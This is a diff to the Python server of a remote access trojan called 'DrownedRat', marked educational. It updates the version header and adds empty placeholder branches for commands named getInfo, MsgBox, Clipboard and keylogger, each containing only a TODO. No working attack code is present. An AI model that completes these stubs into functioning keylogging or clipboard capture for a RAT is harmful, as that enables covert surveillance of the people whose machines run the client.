@@ -2,8 +2,8 @@
 +-----------------------------------------------------------------------+
 |                               DrownedRat                              |
 |    Author: 27016005                                                   |
-|    Version: 0.1                                                       |
-|    Last update: 26-01-2021 (dd-mm-yyyy)                               |
+|    Version: 0.1.1                                                     |
+|    Last update: 09-02-2021 (dd-mm-yyyy)                               |
 |                                                                       |
 |                 [   ONLY FOR EDUCATIONAL PURPOSES   ]                 |
 +-----------------------------------------------------------------------+
@@ -156,7 +156,18 @@ class Server:
             elif command == "disconn":
                 self.client_socket.send(command.encode("utf-8"))
                 print("*** Killed")
+            elif command == "getInfo":  # TODO getInfo
+                '''do this'''
+            elif command == "MsgBox":   # TODO messagebox
+                '''do this'''
+            elif command == "Clipboard ":  # TODO clipboard
+                '''do this'''
+            elif command == "keylogger":         # TODO
+                '''do this'''
+
             else:
+
+
                 print("No Valid Command Received")
         sys.exit()
         # close connection to the client
